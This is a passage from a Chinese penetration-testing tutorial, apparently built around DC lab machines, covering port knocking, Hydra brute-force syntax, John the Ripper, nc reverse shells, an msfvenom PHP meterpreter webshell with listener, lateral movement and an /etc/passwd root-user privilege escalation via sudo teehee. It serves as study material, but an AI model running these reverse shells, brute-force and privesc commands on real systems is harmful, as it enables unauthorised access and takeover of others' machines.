插入一条规则（默认插入第一条），INPUT指的是入站方向的规则链，-s 指定源地址，%IP%：一个变量，指的是连接的客户端的IP地址，-p 指协议（tcp，udp，ip等），--dport 目标端口，此处可以理解为本机开放的服务，-j 动作，ACCEPT接受，DROP丢弃，-D 删除一条规则\n        tcpflags    &#x3D; syn \n\n[closeSSH]\n        sequence    &#x3D; 9000,8000,7000\n        seq_timeout &#x3D; 30\n        command     &#x3D; &#x2F;sbin&#x2F;iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT\n        tcpflags    &#x3D; syn\n\n[openHTTPS]\n        sequence    &#x3D; 12345,54321,24680,13579\n        seq_timeout &#x3D; 5\n        command     &#x3D; &#x2F;usr&#x2F;local&#x2F;sbin&#x2F;knock_add -i -c INPUT -p tcp -d 443 -f %IP%\n        tcpflags    &#x3D; syn\n</code></pre>\n\n<p><code>vim /etc/default/knockd</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230108222428303.png\" alt=\"image-20230108222428303\"></p>\n<p><strong>3.启动Knockd服务</strong></p>\n<p><code>systemctl start knockd</code>#启动服务</p>\n<p><code>systemctl start knockd</code>#设为开机启动</p>\n<p><strong>4.配置防火墙规则,拒绝外部主机连接ssh服务</strong></p>\n<p><code>iptables -I INPUT -p tcp --dport 22 -j REJECT</code>#拒绝,反弹消息</p>\n<p>或</p>\n<p><code>iptables -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT</code></p>\n<p><code>iptables -A INPUT -p tcp -m tcp --dport 22 -j REJECT</code></p>\n<p><strong>以上操作就是配置好了端口敲门服务,只有当别人以7000,8000,9000端口序列连接我们时,ssh才能打开22端口</strong></p>\n<p><code>nc -nv 192.168.2.103 7000</code></p>\n<p><code>nc -nv 192.168.2.103 8000</code></p>\n<p><code>nc -nv 192.168.2.103 9000</code></p>\n<p><strong>通过closeSSH的配置序列,我们还能把端口关上</strong></p>\n<p><code>nc -nv 192.168.2.103 9000</code></p>\n<p><code>nc -nv 192.168.2.103 8000</code></p>\n<p><code>nc -nv 192.168.2.103 7000</code></p>\n<h2 id=\"4-漏洞验证（利用）\"><a href=\"#4-漏洞验证（利用）\" class=\"headerlink\" title=\"4.漏洞验证（利用）\"></a>4.漏洞验证（利用）</h2><h3 id=\"弱口令爆破\"><a href=\"#弱口令爆破\" class=\"headerlink\" title=\"弱口令爆破\"></a>弱口令爆破</h3><h4 id=\"kali自带字典\"><a href=\"#kali自带字典\" class=\"headerlink\" title=\"kali自带字典\"></a>kali自带字典</h4><p>暴力破解能成功最重要的条件还是要有一个强大的密码字典！Kali默认自带了一些字典，在 &#x2F;usr&#x2F;share&#x2F;wordlists 目录下</p>\n<h5 id=\"dirb-1\"><a href=\"#dirb-1\" class=\"headerlink\" title=\"dirb\"></a>dirb</h5><pre class=\"line-numbers language-none\"><code class=\"language-none\">big.txt #大的字典\nsmall.txt #小的字典\ncatala.txt #项目配置字典\ncommon.txt #公共字典\neuskera.txt #数据目录字典\nextensions_common.txt #常用文件扩展名字典\nindexes.txt #首页字典\nmutations_common.txt #备份扩展名\nspanish.txt #方法名或库目录\nothers #扩展目录，默认用户名等\nstress #压力测试\nvulns #漏洞测试</code></pre>\n\n<h5 id=\"dirbuster-1\"><a href=\"#dirbuster-1\" class=\"headerlink\" title=\"dirbuster\"></a>dirbuster</h5><pre class=\"line-numbers language-none\"><code class=\"language-none\">apache-user-enum-** #apache用户枚举\ndirectories.jbrofuzz #目录枚举\ndirectory-list-1.0.txt #目录列表大，中，小 big，medium，small</code></pre>\n\n\n\n<h4 id=\"hydra\"><a href=\"#hydra\" class=\"headerlink\" title=\"hydra\"></a>hydra</h4><p>Hydra是一款非常强大的暴力破解工具，它是由著名的黑客组织THC开发的一款开源暴力破解工具。Hydra是一个验证性质的工具，主要目的是：展示安全研究人员从远程获取一个系统认证权限。</p>\n<p><strong>语法:</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">hydra 参数 IP 服务</code></pre>\n\n<p><strong>参数:</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">-l login 小写，指定用户名进行破解\n-L file 大写，指定用户的用户名字典\n-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。\n-P file 大写，用于指定密码字典。\n-M file 指定目标ip列表文件，批量破解。\n-o file 指定结果输出文件\n-t tasks 同时运行的线程数，默认是16\n-v &#x2F; -V 显示详细过程\n-R 恢复爆破（如果破解中断了，下次执行 hydra -R 继续从上一次进度接着破解&#x2F;path&#x2F;to&#x2F;hydra.restore 就可以继续任务。）\n-x 自定义密码。\n-S\t大写，采用SSL链接\n-s\t小写，可通过这个参数指定非默认端口\n-e\t可选选项，n：空密码试探，s：使用指定用户和密码试探\n-C\t使用冒号分割格式，例如“登录名:密码”来代替 -L&#x2F;-P 参数\n-f\t在使用-M参数以后，找到第一对登录名或者密码的时候中止破解\n-w\t设置最大超时的时间，单位秒，默认是30s\nserver\t目标ip\nservice\t指定服务名，支持的服务和协议</code></pre>\n\n<p><strong>服务:</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">service：指定服务名，支持的服务跟协议有：telnet，ftp，pop3等等。\n注意：\n1.自己创建字典,然后放在当前的目录下或者指定目录。\n2.参数可以统一放在最后，格式比如hydra ip 服务 参数。\n3.如果能确定用户名一项时候，比如web登录破解，直接用 -l就可以，然后剩余时间破解密码。\n4.缺点，如果目标网站登录时候需要验证码就无法破解。\n5.man hydra最万能。\n6.或者hydra -U http-form等查看具体帮助。</code></pre>\n\n\n\n<h5 id=\"破解ssh\"><a href=\"#破解ssh\" class=\"headerlink\" title=\"破解ssh\"></a>破解ssh</h5><p>我们使用如下命令</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">hydra -L user.txt -P passwd.txt -o ssh.txt -vV -t ip  ssh -s 22   \n-L 指定用户字典文件 \n-P 指定密码字典文件  \n-o 把成功的输出到ssh.txt文件 \n-vV 显示详细信息  \n-s 指定其他端口 如果要修改默认22端口，可以使用 -s 参数</code></pre>\n\n<h5 id=\"http协议破解\"><a href=\"#http协议破解\" class=\"headerlink\" title=\"http协议破解\"></a>http协议破解</h5><pre class=\"line-numbers language-none\"><code class=\"language-none\">get方式提交，破解web登录：\n \nhydra -L 用户名字典 -P 密码字典 -t 线程 -v -e ns IP地址 http-get &#x2F;admin&#x2F;\nhydra -L 用户名字典 -P 密码字典 -t 线程 -v -e ns -f IP地址 http-get &#x2F;admin&#x2F;index.php\n \npost方式提交，破解web登录：\n \nhydra -f -l 用户名 -P 密码字典 -V -s 9900 IP地址 http-post-form &quot;&#x2F;admin&#x2F;index.php?action&#x3D;login:user&#x3D;USER&amp;pw&#x3D;PASS:&quot;\n \n \n#&#x2F;index.php …这个是登录的 url\n#后门是POST的数据 其中的用户名密码使用 USER PASS 来代替\n#然后是如果登录出错 会出现的字符 。。。然后开始破解</code></pre>\n\n<h5 id=\"https协议破解\"><a href=\"#https协议破解\" class=\"headerlink\" title=\"https协议破解\"></a>https协议破解</h5><pre class=\"line-numbers language-none\"><code class=\"language-none\">hydra -m &#x2F;index.php -l 用户名 -P 密码字典.txt IP地址 https</code></pre>\n\n<h5 id=\"http-proxy协议破解\"><a href=\"#http-proxy协议破解\" class=\"headerlink\" title=\"http-proxy协议破解\"></a>http-proxy协议破解</h5><pre class=\"line-numbers language-none\"><code class=\"language-none\">hydra -l admin -P 字典.txt http-proxy:&#x2F;&#x2F;IP地址</code></pre>\n\n\n\n<h3 id=\"密码破解\"><a href=\"#密码破解\" class=\"headerlink\" title=\"密码破解\"></a>密码破解</h3><h4 id=\"hash-identifier\"><a href=\"#hash-identifier\" class=\"headerlink\" title=\"hash-identifier\"></a>hash-identifier</h4><p> 当不知道编码或者密文是什么类型的时候，可以通过kali系统中的 hash 工具判别</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230108173754159.png\" alt=\"image-20230108173754159\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230108173817151.png\" alt=\"image-20230108173817151\"></p>\n<h4 id=\"john\"><a href=\"#john\" class=\"headerlink\" title=\"john\"></a>john</h4><p>​\t<code>John the Ripper</code> 是一款大受欢迎的、免费的开源软件。也是一个基于字典的快速破解密码的工具，是一款用于在已知密文的情况下尝试破解出明文的破解密码软件，支持目前大多数的加密算法，如 <code>DES</code> 、 <code>MD4</code> 、 <code>MD5</code> 等。 <code>John the Ripper</code> 支持字典破解方式和暴力破解方式。它支持多种不同类型的系统架构，包括 <code>Unix</code> 、 <code>Linux</code> 、 <code>Windows</code> 、 <code>DOS</code> 模式、 <code>BeOS</code> 和 <code>OpenVMS</code> ，主要目的是破解不够牢固的 <code>Unix/Linux</code> 系统密码</p>\n<p>一些参考文章</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"https://blog.csdn.net/i_can1/article/details/107227565\">https://blog.csdn.net/i_can1/article/details/107227565</a></p>\n<p><a href=\"https://www.cnblogs.com/HelloCTF/p/13346125.html\">https://www.cnblogs.com/HelloCTF/p/13346125.html</a></p>\n<p><a href=\"https://www.cnblogs.com/Junglezt/p/16048189.html\">https://www.cnblogs.com/Junglezt/p/16048189.html</a></p></blockquote>\n<h3 id=\"反弹shell\"><a href=\"#反弹shell\" class=\"headerlink\" title=\"反弹shell\"></a>反弹shell</h3><p>参考文章</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"https://blog.csdn.net/mirocky/article/details/112674080\">https://blog.csdn.net/mirocky/article/details/112674080</a></p>\n<p><a href=\"https://cloud.tencent.com/developer/article/1818091\">https://cloud.tencent.com/developer/article/1818091</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/247967.html\">https://www.freebuf.com/articles/web/247967.html</a></p></blockquote>\n<h4 id=\"利用nc\"><a href=\"#利用nc\" class=\"headerlink\" title=\"利用nc\"></a>利用nc</h4><p>借助kali的nc工具</p>\n<p>nc 借助tcp&#x2F;ip传输数据</p>\n<p>远程控制</p>\n<p>正向连接</p>\n<p>反向连接(反弹shell)   让目标主动连接我方kali等设备,成功之后把shell传给攻击者</p>\n<p>kali端:<code>nc -l -p 888(随便一个端口,但一定要是未使用的)</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nc -l -p 888    \n&#x2F;&#x2F;kali开启侦听某一端口,这里相当于kali变成了服务端\n&#x2F;&#x2F;-l 侦听(listen)\n&#x2F;&#x2F;-p 指定侦听的端口</code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221133136353.png\" alt=\"image-20221221133136353\"></p>\n<p>目标端(受害者):<code>nc -nv kali主机ip 2226 -c /bin/bash </code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nc -nv kali主机ip 888 -c &#x2F;bin&#x2F;bash   \n&#x2F;&#x2F;-c 传递一个shell命令,&#x2F;bin&#x2F;bash就相当把受害主机的shell传过去了\n&#x2F;&#x2F;-n 不做名称解析,提高连接速度\n&#x2F;&#x2F;-v 显示详细信息</code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221133147288.png\" alt=\"image-20221221133147288\"></p>\n<p>就可以看到kali已经拿到shell了</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221133224463.png\" alt=\"image-20221221133224463\"></p>\n<p>获取一个交互式的shell:<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221133630241.png\" alt=\"image-20221221133630241\"></p>\n<h4 id=\"利用msfvenom生成木马\"><a href=\"#利用msfvenom生成木马\" class=\"headerlink\" title=\"利用msfvenom生成木马\"></a>利用msfvenom生成木马</h4><p>通过利用msfvenom生成一段反弹木马(webshell)</p>\n<h5 id=\"生成php木马\"><a href=\"#生成php木马\" class=\"headerlink\" title=\"生成php木马\"></a>生成php木马</h5><p><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=攻击端(监听端)ip LPORT=4444(端口) &gt; shell.php</code></p>\n<p>查看木马</p>\n<p><code>cat shell.php</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106222508076.png\" alt=\"image-20230106222508076\"></p>\n<p>然后就可以把这段代码写入web页面,同时kali开启监听</p>\n<p>kali监听:</p>\n<p>打开msf</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">use exploit&#x2F;multi&#x2F;handler  #调用监听控制模块\nset payload php&#x2F;meterpreter&#x2F;reverse_tcp  #设置payload\nset LHOST kali端ip  #设置漏洞地址\nset lport 4444  #设置监听端口\nexploit </code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106223504904.png\" alt=\"image-20230106223504904\"></p>\n<p>web页面执行之前生成的木马就行了</p>\n<h3 id=\"横向移动\"><a href=\"#横向移动\" class=\"headerlink\" title=\"横向移动\"></a>横向移动</h3><p>可以根据已得到的信息，条件去获取(渗透)系统或LAN内的其他主机的权限(信息)的一种攻击行为</p>\n<p>这里拿dc-4靶机举例</p>\n<h5 id=\"1-信息收集\"><a href=\"#1-信息收集\" class=\"headerlink\" title=\"1.信息收集\"></a>1.信息收集</h5><pre class=\"line-numbers language-none\"><code class=\"language-none\">同之前的信息收集类似\nuname -r           看内核信息\nip a               看IP地址\nhostname           看主机名\nwhoami             看当前用户\ncat &#x2F;etc&#x2F;passwd    看账户信息\nls &#x2F;home           验证用户信息(看有没有他名字对应的文件夹)</code></pre>\n\n<p>之后把你收集到的信息转移到kali中</p>\n<p><code>cp /home/jim/backups/old-passwords.bak root@192.168.1.133:~/Desktop</code></p>\n<h5 id=\"2-针对用户制作字典\"><a href=\"#2-针对用户制作字典\" class=\"headerlink\" title=\"2.针对用户制作字典\"></a>2.针对用户制作字典</h5><p>可以利用信息收集得到的情报制作字典</p>\n<h5 id=\"3-尝试使用工具破解远程主机\"><a href=\"#3-尝试使用工具破解远程主机\" class=\"headerlink\" title=\"3.尝试使用工具破解远程主机\"></a>3.尝试使用工具破解远程主机</h5><p><strong>这里主要介绍使用hydra破解远程主机</strong></p>\n<p><code>hydra -L username.txt -P old-passwords.bak 192.168.1.132 ssh</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221155135369.png\" alt=\"image-20221221155135369\"></p>\n<h5 id=\"4-ssh远程登录\"><a href=\"#4-ssh远程登录\" class=\"headerlink\" title=\"4.ssh远程登录\"></a>4.ssh远程登录</h5><p><code>ssh jim@192.168.1.132</code>,然后输入密码</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221160037137.png\" alt=\"image-20221221160037137\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221160028733.png\" alt=\"image-20221221160028733\"></p>\n<h5 id=\"5-提权\"><a href=\"#5-提权\" class=\"headerlink\" title=\"5.提权\"></a>5.提权</h5><p>见本篇提权部分</p>\n<h2 id=\"5-权限维持\"><a href=\"#5-权限维持\" class=\"headerlink\" title=\"5.权限维持\"></a>5.权限维持</h2><h3 id=\"rbash逃逸\"><a href=\"#rbash逃逸\" class=\"headerlink\" title=\"rbash逃逸\"></a>rbash逃逸</h3><p>rbash(The restricted mode of bash),也就是限制型bash；是平时所谓的 restricted shell的一种，也是最常见的 restricted shell（rbash、ksh、rsh等）</p>\n<p>一些参考文章</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"https://xz.aliyun.com/t/7642\">https://xz.aliyun.com/t/7642</a></p>\n<p><a href=\"https://blog.csdn.net/qq_43168364/article/details/111830233\">https://blog.csdn.net/qq_43168364/article/details/111830233</a></p></blockquote>\n<h2 id=\"6-权限提升\"><a href=\"#6-权限提升\" class=\"headerlink\" title=\"6.权限提升\"></a>6.权限提升</h2><h3 id=\"前期工作\"><a href=\"#前期工作\" class=\"headerlink\" title=\"前期工作\"></a>前期工作</h3><h4 id=\"收集漏洞\"><a href=\"#收集漏洞\" class=\"headerlink\" title=\"收集漏洞\"></a>收集漏洞</h4><p>这里介绍kali的searchsploit</p>\n<p>searchsploit通过搜索关键词找到需要的漏洞，可以理解为一个离线的漏洞库</p>\n<p>详细使用见:</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"https://zhuanlan.zhihu.com/p/366946217\">https://zhuanlan.zhihu.com/p/366946217</a></p></blockquote>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221161952569.png\" alt=\"image-20221221161952569\"></p>\n<h4 id=\"查看自己的sudo授权列表\"><a href=\"#查看自己的sudo授权列表\" class=\"headerlink\" title=\"查看自己的sudo授权列表\"></a>查看自己的sudo授权列表</h4><p><code>sudo -l</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221163501704.png\" alt=\"image-20221221163501704\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221163521970.png\" alt=\"image-20221221163521970\"></p>\n<h4 id=\"尝试切换用户\"><a href=\"#尝试切换用户\" class=\"headerlink\" title=\"尝试切换用户\"></a>尝试切换用户</h4><p><code>su - 用户名</code></p>\n<p><code>输入密码</code></p>\n<h3 id=\"teehee提权\"><a href=\"#teehee提权\" class=\"headerlink\" title=\"teehee提权\"></a>teehee提权</h3><p>teehee是个小众的linux编辑器。<strong>如果有sudo权限。可以利用其来提权</strong></p>\n<p>核心思路就是利用其在passwd文件中追加一条uid为0的用户条目</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">echo &quot;raaj::0:0:::&#x2F;bin&#x2F;bash&quot; | sudo teehee -a &#x2F;etc&#x2F;passwd</code></pre>\n\n<p>按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录。所以只需要执行su raaj就可以登录到raaj用户，这个用户因为uid为0，所以也是root权限</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\"># teehee 可以将标准输入复制到文件中\n# 如下命令可以在 &#x2F;etc&#x2F;passwd 文件中添加一行，实现添加一个拥有 root 权限的用户\n\necho &quot;test::0:0:::&#x2F;bin&#x2F;sh&quot; | sudo teehee -a &#x2F;etc&#x2F;passwd\n&#x2F;&#x2F;test是用户名\n&#x2F;&#x2F;test::意思是test用户,密码为空\n&#x2F;&#x2F;test::0:0:::&#x2F;bin&#x2F;sh 意思是用户名为test,密码为空的超级用户\n&#x2F;&#x2F;-a 追加到..\n&#x2F;&#x2F; &#x2F;etc&#x2F;passwd 用户账号信息文件\n\n# 切换用户\nsu test</code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221172616200.png\" alt=\"image-20221221172616200\"></p>\n<h3 id=\"git提权\"><a href=\"#git提权\" class=\"headerlink\" title=\"git提权\"></a>git提权</h3><p>什么是git?</p>\n<p>GIT，全称是<strong>分布式版本控制系统</strong>，git通常在编程中会用到，并且git支持分布式部署，可以有效、高速的处理从很小到非常大的项目版本管理。分布式相比于集中式的最大区别在于开发者可以提交到本地，每个开发者通过克隆（git clone），在本地机器上拷贝一个完整的Git仓库。</p>\n<p>参考文章</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" 